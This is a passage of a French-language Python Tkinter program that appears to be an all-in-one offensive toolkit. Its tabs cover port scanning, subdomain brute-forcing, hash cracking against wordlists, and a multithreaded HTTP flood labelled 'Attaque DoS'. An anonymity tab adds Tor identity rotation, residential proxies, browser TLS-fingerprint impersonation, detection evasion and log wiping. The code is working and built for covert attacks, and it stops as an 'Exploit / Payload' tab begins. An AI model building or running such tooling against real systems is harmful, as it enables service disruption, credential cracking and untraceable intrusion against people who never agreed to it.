        ttk.Label(f, text="Cible (domaine/IP):").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_target = ttk.Entry(f, width=40, font=("TkDefaultFont", 11))
        self.entry_target.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=2, pady=5)
        ttk.Button(btn_frame, text="Whois", command=self.run_whois).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Résolution DNS", command=self.run_dns).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Scanner Ports", command=self.run_scan).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="OSINT Complet", command=self.run_full).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Sous-domaines", command=self.run_subdomains).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="GeoIP", command=self.run_geoip).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_target(self):
        t = self.entry_target.get().strip()
        if not t:
            messagebox.showwarning("Attention", "Entrez un domaine ou IP.")
            return None
        return t

    def run_whois(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_whois(t))

    def do_whois(self, t):
        self.log(self.output, f"Whois pour {t}:", "bold")
        try:
            w = whois.whois(t)
            for field in ["registrar", "name", "org", "country", "creation_date", "expiration_date", "name_servers"]:
                val = w.get(field)
                if val:
                    self.log(self.output, f"  {field}: {val}")
        except Exception as e:
            self.log(self.output, f"Erreur whois: {e}", "error")

    def run_dns(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_dns(t))

    def do_dns(self, t):
        self.log(self.output, f"DNS resolution pour {t}:", "bold")
        try:
            ip = socket.gethostbyname(t)
            self.log(self.output, f"  IPv4: {ip}", "success")
            try:
                host = socket.gethostbyaddr(ip)
                self.log(self.output, f"  Hostname: {host[0]}")
            except:
                pass
        except:
            self.log(self.output, "  R\u00e9solution \u00e9chou\u00e9e", "error")

    def run_scan(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_scan(t))

    def do_scan(self, t):
        ip = resolve_target(t)
        self.log(self.output, f"Scan ports pour {ip}:", "bold")
        ports = [21, 22, 23, 25, 80, 110, 443, 445, 3306, 3389, 8080, 8443]
        random.shuffle(ports)
        for p in ports:
            if self.app.stealth.get("enabled"):
                time.sleep(random.uniform(0.2, 0.8))
            if scan_port(ip, p):
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")

    def run_full(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_full(t))

    def do_full(self, t):
        self.log(self.output, f"=== OSINT Complet: {t} ===", "bold")
        ip = resolve_target(t)
        self.log(self.output, f"\n[IP] {ip}")
        try:
            w = whois.whois(t)
            self.log(self.output, f"\n[Whois] Registrar: {w.registrar}")
            self.log(self.output, f"          Country: {w.country}")
            self.log(self.output, f"          Created: {w.creation_date}")
        except:
            pass
        self.log(self.output, "\n[Ports]")
        for p in [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]:
            if scan_port(ip, p):
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")
        self.log(self.output, "\n[HTTP]")
        try:
            r = self.app.session.get(f"http://{ip}", timeout=5, verify=False)
            self.log(self.output, f"  Statut: {r.status_code}")
            self.log(self.output, f"  Server: {r.headers.get('Server', 'N/A')}")
        except:
            self.log(self.output, "  Pas de r\u00e9ponse HTTP", "warning")

    # ── Subdomain Enumeration ──
    def run_subdomains(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_subdomains(t))

    def do_subdomains(self, t):
        self.log(self.output, f"Enum\u00e9ration de sous-domaines pour {t}...", "bold")
        wordlist = ["www", "mail", "ftp", "admin", "blog", "webmail", "forum", "shop",
                    "api", "dev", "test", "beta", "vpn", "remote", "portal", "support",
                    "wiki", "app", "cdn", "static", "assets", "img", "dns", "ns1", "ns2",
                    "smtp", "pop3", "imap", "mysql", "db", "backup", "git", "jenkins",
                    "jira", "confluence", "help", "status", "docs", "tracker", "cloud",
                    "mx1", "mx2", "cpanel", "whm", "server", "gateway", "firewall",
                    "proxy", "intranet", "owa", "exchange", "calendar", "drive",
                    "login", "register", "download", "upload", "media", "news"]
        found = []
        for sub in wordlist:
            domain = f"{sub}.{t}"
            try:
                ip = socket.gethostbyname(domain)
                found.append((domain, ip))
                self.log(self.output, f"  \u2713 {domain} \u2192 {ip}", "success")
            except:
                pass
        if not found:
            self.log(self.output, "  Aucun sous-domaine trouv\u00e9.", "warning")
        else:
            self.log(self.output, f"\nTotal: {len(found)} sous-domaine(s) trouv\u00e9(s).", "bold")

    # ── GeoIP Lookup ──
    def run_geoip(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_geoip(t))

    def do_geoip(self, t):
        ip = resolve_target(t)
        self.log(self.output, f"G\u00e9olocalisation pour {ip}:", "bold")
        try:
            r = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    self.log(self.output, f"  Pays: {data.get('country', 'N/A')}", "success")
                    self.log(self.output, f"  R\u00e9gion: {data.get('regionName', 'N/A')}")
                    self.log(self.output, f"  Ville: {data.get('city', 'N/A')}")
                    self.log(self.output, f"  ISP: {data.get('isp', 'N/A')}")
                    self.log(self.output, f"  Organisation: {data.get('org', 'N/A')}")
                    self.log(self.output, f"  Coordonn\u00e9es: {data.get('lat', '?')}, {data.get('lon', '?')}")
                else:
                    self.log(self.output, f"  Erreur API: {data.get('message', 'inconnue')}", "error")
            else:
                self.log(self.output, "  Service indisponible.", "error")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")


# ════════════════════════ 5. PASSWORD ANALYSIS ════════════════════════
class PasswordTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Analyse Mots de Passe")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="Mot de passe:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_pwd = ttk.Entry(f, show="*", width=40, font=("TkDefaultFont", 11))
        self.entry_pwd.grid(row=0, column=1, padx=5, pady=5)
        self.show_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Afficher", variable=self.show_var,
                        command=lambda: self.entry_pwd.config(show="" if self.show_var.get() else "*")
                        ).grid(row=0, column=2, padx=5)

        gen_frame = ttk.Frame(f)
        gen_frame.grid(row=1, column=0, columnspan=3, pady=5)
        ttk.Label(gen_frame, text="Longueur:").pack(side=tk.LEFT, padx=5)
        self.spin_len = ttk.Spinbox(gen_frame, from_=8, to=64, width=5, value=20)
        self.spin_len.pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="G\u00e9n\u00e9rer", command=self.run_generate).pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="Analyser", command=self.run_analyze).pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="G\u00e9n.Hash", command=self.run_generate_hash).pack(side=tk.LEFT, padx=5)

        hf = ttk.LabelFrame(main, text="Craquage de Hash")
        hf.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(hf, text="Hash:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_hash = ttk.Entry(hf, width=50, font=("TkDefaultFont", 11))
        self.entry_hash.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        hf.columnconfigure(1, weight=1)

        self.hash_type = tk.StringVar(value="MD5")
        ttk.Radiobutton(hf, text="MD5", variable=self.hash_type, value="MD5").grid(row=0, column=2, padx=2)
        ttk.Radiobutton(hf, text="SHA1", variable=self.hash_type, value="SHA1").grid(row=0, column=3, padx=2)
        ttk.Radiobutton(hf, text="SHA256", variable=self.hash_type, value="SHA256").grid(row=0, column=4, padx=2)

        btn_hf = ttk.Frame(hf)
        btn_hf.grid(row=1, column=0, columnspan=5, pady=5)
        ttk.Button(btn_hf, text="Crack (int\u00e9gr\u00e9)", command=self.run_crack_hash).pack(side=tk.LEFT, padx=3)
        ttk.Label(btn_hf, text="Wordlist:").pack(side=tk.LEFT, padx=(10, 2))
        self.entry_wordlist = ttk.Entry(btn_hf, width=30)
        self.entry_wordlist.pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_hf, text="Parcourir", command=self.browse_wordlist).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_hf, text="Crack (fichier)", command=self.run_crack_file).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def run_analyze(self):
        self.clear(self.output)
        pwd = self.entry_pwd.get()
        if not pwd:
            messagebox.showwarning("Attention", "Entrez un mot de passe.")
            return
        self.run_thread(lambda: self.do_analyze(pwd))

    def do_analyze(self, pwd):
        self.log(self.output, f"Analyse du mot de passe:", "bold")
        self.log(self.output, f"  Longueur: {len(pwd)} caract\u00e8res")

        score = 0
        if len(pwd) >= 8:
            score += 20
        if len(pwd) >= 12:
            score += 10
        if len(pwd) >= 16:
            score += 10
        if any(c.isupper() for c in pwd):
            score += 15
        if any(c.islower() for c in pwd):
            score += 10
        if any(c.isdigit() for c in pwd):
            score += 15
        if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?`~" for c in pwd):
            score += 20
        self.log(self.output, f"  Score: {min(score, 100)}/100")

        if score >= 80:
            strength = "Fort"
            s_tag = "success"
        elif score >= 50:
            strength = "Moyen"
            s_tag = "warning"
        else:
            strength = "Faible"
            s_tag = "error"
        self.log(self.output, f"  Force: {strength}", s_tag)

        entropy = 0
        charset = 0
        if any(c.islower() for c in pwd):
            charset += 26
        if any(c.isupper() for c in pwd):
            charset += 26
        if any(c.isdigit() for c in pwd):
            charset += 10
        if any(c in "!@#$%^&*()_+-=[]{}|;':\",./<>?`~" for c in pwd):
            charset += 30
        if charset:
            entropy = len(pwd) * (charset.bit_length())
        self.log(self.output, f"  Entropie: {entropy} bits")

        common = ["password", "123456", "admin", "qwerty", "letmein", "welcome",
                  "monkey", "dragon", "master", "football", "iloveyou", "sunshine"]
        if pwd.lower() in common:
            self.log(self.output, f"  \u26a0 Mot de passe trop commun!", "error")

        self.log(self.output, f"\nTemps estim\u00e9 pour craquer:")
        if entropy >= 80:
            self.log(self.output, f"  En ligne: > 10 ans", "success")
            self.log(self.output, f"  Hors ligne: > 100 ans", "success")
        elif entropy >= 50:
            self.log(self.output, f"  En ligne: ~ 1 an", "warning")
            self.log(self.output, f"  Hors ligne: ~ 10 ans", "warning")
        else:
            self.log(self.output, f"  En ligne: < 1 mois", "error")
            self.log(self.output, f"  Hors ligne: < 1 an", "error")

    def run_generate(self):
        self.clear(self.output)
        length = int(self.spin_len.get())
        self.run_thread(lambda: self.do_generate(length))

    def do_generate(self, length):
        import secrets
        import string
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
        pwd = "".join(secrets.choice(chars) for _ in range(length))
        self.log(self.output, f"Mot de passe g\u00e9n\u00e9r\u00e9 ({length} caract\u00e8res):", "bold")
        self.log(self.output, f"  {pwd}", "success")
        self.entry_pwd.delete(0, tk.END)
        self.entry_pwd.insert(0, pwd)

    # ── Hash Cracker ──
    def run_crack_hash(self):
        self.clear(self.output)
        h = self.entry_hash.get().strip()
        if not h:
            messagebox.showwarning("Attention", "Entrez un hash.")
            return
        self.run_thread(lambda: self.do_crack_hash(h))

    def do_crack_hash(self, h):
        import hashlib
        self.log(self.output, f"Tentative de craquage du hash: {h}", "bold")
        algo = self.hash_type.get()
        self.log(self.output, f"Algorithme: {algo}\n")

        common_pwds = [
            "123456", "password", "admin", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "sunshine", "qwerty123",
            "iloveyou", "princess", "admin123", "welcome", "monkey", "dragon",
            "master", "letmein", "login", "abc123", "passw0rd", "shadow",
            "root", "test", "guest", "user", "server", "changeme",
            "123qwe", "1q2w3e4r", "zaq12wsx", "trustno1", "pass123",
        ]

        found = False
        for pwd in common_pwds:
            if algo == "MD5":
                h_calc = hashlib.md5(pwd.encode()).hexdigest()
            elif algo == "SHA1":
                h_calc = hashlib.sha1(pwd.encode()).hexdigest()
            elif algo == "SHA256":
                h_calc = hashlib.sha256(pwd.encode()).hexdigest()
            else:
                self.log(self.output, "Algorithme non support\u00e9.", "error")
                return

            if h_calc == h.lower():
                self.log(self.output, f"  \u2713 TROUV\u00c9: {pwd}", "success")
                self.entry_pwd.delete(0, tk.END)
                self.entry_pwd.insert(0, pwd)
                found = True
                break

        if not found:
            self.log(self.output, "  Hash non trouv\u00e9 dans la wordlist.", "warning")
            self.log(self.output, "  Essayez avec une wordlist personnalis\u00e9e via 'Fichier'.", "warning")

    def run_crack_file(self):
        h = self.entry_hash.get().strip()
        fpath = self.entry_wordlist.get().strip()
        if not h or not fpath:
            messagebox.showwarning("Attention", "Entrez un hash et un fichier wordlist.")
            return
        if not os.path.isfile(fpath):
            messagebox.showerror("Erreur", "Fichier wordlist introuvable.")
            return
        self.clear(self.output)
        self.run_thread(lambda: self.do_crack_file(h, fpath))

    def do_crack_file(self, h, fpath):
        import hashlib
        algo = self.hash_type.get()
        self.log(self.output, f"Craquage avec wordlist: {fpath}", "bold")
        self.log(self.output, f"Hash: {h} ({algo})\n")

        try:
            with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    pwd = line.strip()
                    if not pwd:
                        continue
                    if algo == "MD5":
                        h_calc = hashlib.md5(pwd.encode()).hexdigest()
                    elif algo == "SHA1":
                        h_calc = hashlib.sha1(pwd.encode()).hexdigest()
                    elif algo == "SHA256":
                        h_calc = hashlib.sha256(pwd.encode()).hexdigest()
                    else:
                        return
                    if h_calc == h.lower():
                        self.log(self.output, f"  \u2713 TROUV\u00c9: {pwd}", "success")
                        self.entry_pwd.delete(0, tk.END)
                        self.entry_pwd.insert(0, pwd)
                        return
            self.log(self.output, "  Hash non trouv\u00e9 dans ce fichier.", "warning")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")

    def browse_wordlist(self):
        fpath = filedialog.askopenfilename(title="Choisir une wordlist",
                                           filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if fpath:
            self.entry_wordlist.delete(0, tk.END)
            self.entry_wordlist.insert(0, fpath)

    def run_generate_hash(self):
        pwd = self.entry_pwd.get().strip()
        if not pwd:
            messagebox.showwarning("Attention", "Entrez un mot de passe ou utilisez G\u00e9n\u00e9rer.")
            return
        self.clear(self.output)
        self.run_thread(lambda: self.do_generate_hash(pwd))

    def do_generate_hash(self, pwd):
        import hashlib
        self.log(self.output, f"Hashes pour: {pwd}", "bold")
        self.log(self.output, f"  MD5:    {hashlib.md5(pwd.encode()).hexdigest()}")
        self.log(self.output, f"  SHA1:   {hashlib.sha1(pwd.encode()).hexdigest()}")
        self.log(self.output, f"  SHA256: {hashlib.sha256(pwd.encode()).hexdigest()}")


# ════════════════════════ 6. DoS / STRESS TEST ════════════════════════
class DoSTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.running = False
        self.stop_flag = threading.Event()
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="DoS / Test de Stress")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="URL cible:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_url = ttk.Entry(f, width=50, font=("TkDefaultFont", 11))
        self.entry_url.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Threads:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.spin_threads = ttk.Spinbox(f, from_=1, to=100, width=5, value=10)
        self.spin_threads.grid(row=1, column=1, padx=5, pady=5, sticky="w")

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=2, column=0, columnspan=2, pady=5)
        self.btn_start = ttk.Button(btn_frame, text="Démarrer DoS", command=self.run_dos)
        self.btn_start.pack(side=tk.LEFT, padx=5)
        self.btn_stop = ttk.Button(btn_frame, text="Arrêter", command=self.stop_dos, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=5)

        self.output = self.make_output(main)

    def run_dos(self):
        url = self.entry_url.get().strip()
        if not url:
            messagebox.showwarning("Attention", "Entrez une URL.")
            return
        if not url.startswith("http"):
            if ":443" in url or "https" in url.lower():
                url = "https://" + url
            else:
                url = "http://" + url
            self.entry_url.delete(0, tk.END)
            self.entry_url.insert(0, url)

        self.clear(self.output)
        self.stop_flag.clear()
        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.run_thread(lambda: self.do_dos(url))

    def do_dos(self, url):
        n_threads = int(self.spin_threads.get())
        self.log(self.output, f"Attaque DoS sur {url}", "bold")
        self.log(self.output, f"Threads: {n_threads}")
        self.log(self.output, "Appuyez sur Stop pour arr\u00eater.\n")

        stats = {"sent": 0, "errors": 0}
        lock = threading.Lock()

        def worker():
            while not self.stop_flag.is_set():
                try:
                    self.app.session.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"})
                    with lock:
                        stats["sent"] += 1
                except:
                    with lock:
                        stats["errors"] += 1

        for _ in range(n_threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()

        while not self.stop_flag.is_set():
            time.sleep(2)
            with lock:
                self.log(self.output, f"  Envoy\u00e9es: {stats['sent']}  |  Erreurs: {stats['errors']}")
            if stats["errors"] > stats["sent"] * 2 and stats["sent"] > 10:
                self.log(self.output, "  [!] Cible peut-\u00eatre down ou bloqu\u00e9e", "warning")

        self.log(self.output, "\nAttaque arr\u00eat\u00e9e.", "bold")
        self.log(self.output, f"Total: {stats['sent']} requ\u00eates, {stats['errors']} erreurs")

    def stop_dos(self):
        self.stop_flag.set()
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)


# ════════════════════════ 7. ANONYMITY / TOR / STEALTH ════════════════════════
class AnonymityTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # ── Tor Control ──
        f = ttk.LabelFrame(main, text="Contr\u00f4le Tor")
        f.pack(fill=tk.X, pady=(0, 6))

        self.btn_tor = ttk.Button(f, text="Activer Tor", command=self.toggle_tor, width=20)
        self.btn_tor.grid(row=0, column=0, padx=10, pady=8)

        info_frame = ttk.Frame(f)
        info_frame.grid(row=0, column=1, padx=10, pady=8, sticky="w")
        self.lbl_status = ttk.Label(info_frame, text="Statut: D\u00e9sactiv\u00e9", font=("TkDefaultFont", 10))
        self.lbl_status.pack(anchor="w")
        self.lbl_ip = ttk.Label(info_frame, text="IP: ---", font=("TkDefaultFont", 10, "bold"))
        self.lbl_ip.pack(anchor="w")

        ctrl_frame = ttk.Frame(f)
        ctrl_frame.grid(row=1, column=0, columnspan=2, pady=(0, 8))
        ttk.Button(ctrl_frame, text="Nouvelle Identit\u00e9", command=self.run_new_id, width=18).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl_frame, text="V\u00e9rifier IP", command=self.run_check_ip, width=14).pack(side=tk.LEFT, padx=3)
        ttk.Button(ctrl_frame, text="Effacer Logs", command=self.run_wipe, width=14).pack(side=tk.LEFT, padx=3)

        # ── Stealth Mode ──
        sf = ttk.LabelFrame(main, text="Mode Furtif (Stealth) — \u00c9vite la d\u00e9tection")
        sf.pack(fill=tk.X, pady=(0, 6))

        self.btn_stealth = ttk.Button(sf, text="Activer Stealth", command=self.toggle_stealth, width=20)
        self.btn_stealth.grid(row=0, column=0, padx=10, pady=8, rowspan=2)

        ttk.Label(sf, text="Delai min (s):").grid(row=0, column=1, padx=3, pady=2, sticky="e")
        self.entry_dmin = ttk.Entry(sf, width=6)
        self.entry_dmin.insert(0, "0.5")
        self.entry_dmin.grid(row=0, column=2, padx=3, pady=2, sticky="w")

        ttk.Label(sf, text="Delai max (s):").grid(row=0, column=3, padx=3, pady=2, sticky="e")
        self.entry_dmax = ttk.Entry(sf, width=6)
        self.entry_dmax.insert(0, "2.0")
        self.entry_dmax.grid(row=0, column=4, padx=3, pady=2, sticky="w")

        ttk.Label(sf, text="Auto IP toutes les:").grid(row=1, column=1, padx=3, pady=2, sticky="e")
        self.entry_ipfreq = ttk.Entry(sf, width=6)
        self.entry_ipfreq.insert(0, "10")
        self.entry_ipfreq.grid(row=1, column=2, padx=3, pady=2, sticky="w")
        ttk.Label(sf, text="requ\u00eates").grid(row=1, column=3, padx=2, pady=2, sticky="w")
        self.var_autoip = tk.BooleanVar(value=False)
        ttk.Checkbutton(sf, text="Auto IP", variable=self.var_autoip).grid(row=1, column=4, padx=5, pady=2)

        self.lbl_stealth_status = ttk.Label(sf, text="Stealth: OFF", font=("TkDefaultFont", 10, "bold"), foreground="gray")
        self.lbl_stealth_status.grid(row=0, column=5, padx=15, pady=2)

        # ── Tor Settings ──
        sec = ttk.LabelFrame(main, text="Param\u00e8tres Tor")
        sec.pack(fill=tk.X, pady=(0, 6))
        ttk.Label(sec, text="SOCKS Port:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
        self.entry_socks = ttk.Entry(sec, width=8)
        self.entry_socks.insert(0, "9050")
        self.entry_socks.grid(row=0, column=1, padx=5, pady=4, sticky="w")
        ttk.Label(sec, text="Port contrôle:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
        self.entry_ctrl = ttk.Entry(sec, width=8)
        self.entry_ctrl.insert(0, "9051")
        self.entry_ctrl.grid(row=0, column=3, padx=5, pady=4, sticky="w")
        ttk.Label(sec, text="Mot de passe:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
        self.entry_pass = ttk.Entry(sec, width=15, show="*")
        self.entry_pass.grid(row=0, column=5, padx=5, pady=4, sticky="w")
        ttk.Button(sec, text="Appliquer", command=self.apply_tor_settings, width=10).grid(row=0, column=6, padx=5)

        # ── Residential Proxy ──
        ps = ttk.LabelFrame(main, text="Proxy R\u00e9sidentiel (optionnel — remplace Tor)")
        ps.pack(fill=tk.X, pady=(0, 6))
        self.btn_proxy = ttk.Button(ps, text="Activer Proxy", command=self.toggle_proxy, width=20)
        self.btn_proxy.grid(row=0, column=0, padx=8, pady=8, rowspan=2)
        ttk.Label(ps, text="URL (ex: http://proxy:port):").grid(row=0, column=1, padx=3, pady=2, sticky="e")
        self.entry_purl = ttk.Entry(ps, width=35)
        self.entry_purl.grid(row=0, column=2, padx=3, pady=2, sticky="w")
        ttk.Label(ps, text="User:").grid(row=1, column=1, padx=3, pady=2, sticky="e")
        self.entry_puser = ttk.Entry(ps, width=15)
        self.entry_puser.grid(row=1, column=2, padx=3, pady=2, sticky="w")
        ttk.Label(ps, text="Pass:").grid(row=1, column=3, padx=3, pady=2, sticky="e")
        self.entry_ppass = ttk.Entry(ps, width=15, show="*")
        self.entry_ppass.grid(row=1, column=4, padx=3, pady=2, sticky="w")
        self.lbl_proxy_status = ttk.Label(ps, text="Proxy: OFF", font=("TkDefaultFont", 9, "bold"), foreground="gray")
        self.lbl_proxy_status.grid(row=0, column=5, padx=10, pady=2)

        info = ttk.LabelFrame(main, text="Protection compl\u00e8te — Anti-d\u00e9tection")
        info.pack(fill=tk.X, pady=(0, 6))
        ttk.Label(info, text=(
            "Stack Anti-d\u00e9tection actif (Stealth ON) :\n"
            "  \u2022 TLS fingerprint : imite Chrome/Firefox/Safari r\u00e9els (curl_cffi)\n"
            "  \u2022 User-Agent al\u00e9atoire parmi 12 navigateurs r\u00e9cents\n"
            "  \u2022 Headers HTTP r\u00e9alistes (Accept, Sec-Fetch, etc.)\n"
            "  \u2022 D\u00e9lai al\u00e9atoire entre chaque requ\u00eate (\u00e9vite le rate-limiting)\n"
            "  \u2022 Auto-changement d'IP Tor toutes les N requ\u00eates\n"
            "  \u2022 Ordre des ports randomis\u00e9 (+ d\u00e9lai entre chaque test)\n"
            "  \u2022 Proxy r\u00e9sidentiel support\u00e9 (HTTP/HTTPS/SOCKS5)\n"
            "  \u2022 Aucun log local conserv\u00e9 (utilisez Wipe)"
        ), foreground="gray", wraplength=780).pack(padx=10, pady=8, anchor="w")

        self.output = self.make_output(main)

    # ── Tor ──
    def toggle_tor(self):
        if self.app.tor.enabled:
            success, msg = self.app.tor.disable()
            self.btn_tor.config(text="Activer Tor")
            self.lbl_status.config(text="Statut: D\u00e9sactiv\u00e9", foreground="black")
        else:
            self.apply_tor_settings()
            success, msg = self.app.tor.enable()
            if success:
                self.btn_tor.config(text="D\u00e9sactiver Tor")
                self.lbl_status.config(text=f"Statut: Activ\u00e9", foreground="green")
                self.lbl_ip.config(text=f"IP: {self.app.tor.current_ip}")
            else:
                messagebox.showerror("Erreur", msg)
        self.app.update_tor_status()

    def run_new_id(self):
        self.run_thread(lambda: self.do_new_id())

    def do_new_id(self):
        self.log(self.output, "Changement d'identit\u00e9 Tor...", "bold")
        success, msg = self.app.tor.new_identity()
        self.log(self.output, msg, "success" if success else "error")
        self.app.after(0, lambda: self._update_after_newid(success))

    def _update_after_newid(self, success):
        if success:
            self.lbl_ip.config(text=f"IP: {self.app.tor.current_ip}")
        else:
            self.log(self.output, "Astuce: d\u00e9commentez ControlPort 9051 dans /etc/tor/torrc", "warning")
        self.app.update_tor_status()

    def run_check_ip(self):
        self.run_thread(lambda: self.do_check_ip())

    def do_check_ip(self):
        self.log(self.output, "V\u00e9rification de l'IP...", "bold")
        try:
            r = self.app.session.get("https://api.ipify.org?format=json", timeout=8)
            ip = r.json().get("ip", "Inconnu")
            self.log(self.output, f"  IP actuelle: {ip}", "success")
            self.app.after(0, lambda: self.lbl_ip.config(text=f"IP: {ip}"))
            try:
                r2 = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
                data = r2.json()
                if data.get("status") == "success":
                    self.log(self.output, f"  Pays: {data.get('country', 'N/A')}")
                    self.log(self.output, f"  ISP: {data.get('isp', 'N/A')}")
            except:
                pass
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")
        self.app.after(0, self.app.update_tor_status)

    # ── Stealth ──
    def toggle_stealth(self):
        cfg = self.app.stealth
        if cfg["enabled"]:
            cfg["enabled"] = False
            self.btn_stealth.config(text="Activer Stealth")
            self.lbl_stealth_status.config(text="Stealth: OFF", foreground="gray")
            self.log(self.output, "Mode furtif d\u00e9sactiv\u00e9.", "warning")
        else:
            try:
                dmin = float(self.entry_dmin.get().strip())
                dmax = float(self.entry_dmax.get().strip())
                if dmin < 0 or dmax < dmin:
                    raise ValueError
                cfg["delay_min"] = dmin
                cfg["delay_max"] = dmax
                cfg["auto_ip"] = self.var_autoip.get()
                cfg["ip_after"] = int(self.entry_ipfreq.get().strip())
                cfg["enabled"] = True
                self.btn_stealth.config(text="D\u00e9sactiver Stealth")
                self.lbl_stealth_status.config(text="Stealth: ON", foreground="cyan")
                self.log(self.output, "Mode furtif ACTIV\u00c9.", "success")
                self.log(self.output, f"  TLS fingerprint: impersonate Chrome/Firefox/Safari")
                self.log(self.output, f"  User-Agent: al\u00e9atoire (12 profils)")
                self.log(self.output, f"  D\u00e9lai: {dmin}-{dmax}s")
                if cfg["auto_ip"]:
                    self.log(self.output, f"  Auto IP: toutes les {cfg['ip_after']} req.")
            except ValueError:
                messagebox.showerror("Erreur", "Valeurs de d\u00e9lai invalides (min >= 0, max >= min).")
                return
        self.app.update_tor_status()

    # ── Wipe ──
    def run_wipe(self):
        for tab in self.app.tabs.values():
            if hasattr(tab, "output"):
                self.clear(tab.output)
        self.log(self.output, "Tous les logs ont \u00e9t\u00e9 effac\u00e9s.", "success")
        self.log(self.output, "Aucune trace locale conserv\u00e9e.", "success")

    # ── Tor Settings ──
    def apply_tor_settings(self):
        try:
            self.app.tor.socks_port = int(self.entry_socks.get().strip())
            self.app.tor.control_port = int(self.entry_ctrl.get().strip())
            self.app.tor.password = self.entry_pass.get().strip()
            if self.app.tor.enabled:
                self.app.tor.disable()
                self.app.tor.enable()
        except ValueError:
            messagebox.showerror("Erreur", "Ports invalides.")

    # ── Residential Proxy ──
    def toggle_proxy(self):
        pm = self.app.proxy
        if pm.enabled:
            pm.enabled = False
            pm.disable(self.app.session)
            self.btn_proxy.config(text="Activer Proxy")
            self.lbl_proxy_status.config(text="Proxy: OFF", foreground="gray")
            self.log(self.output, "Proxy r\u00e9sidentiel d\u00e9sactiv\u00e9.", "warning")
        else:
            url = self.entry_purl.get().strip()
            if not url:
                messagebox.showerror("Erreur", "Entrez une URL de proxy.")
                return
            pm.url = url
            pm.username = self.entry_puser.get().strip()
            pm.password = self.entry_ppass.get().strip()
            pm.enabled = True
            pm.apply(self.app.session)
            self.btn_proxy.config(text="D\u00e9sactiver Proxy")
            self.lbl_proxy_status.config(text="Proxy: ON", foreground="cyan")
            self.log(self.output, f"Proxy activ\u00e9: {pm.url}", "success")
            if pm.username:
                self.log(self.output, f"  Authentification: {pm.username}", "success")
        self.app.update_tor_status()


# ════════════════════════ 8. EXPLOIT / PAYLOAD ════════════════════════
class ExploitTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        warn = ttk.LabelFrame(main, text="\u26a0 Avertissement")
        warn.pack(fill=tk.X, pady=(0, 6))
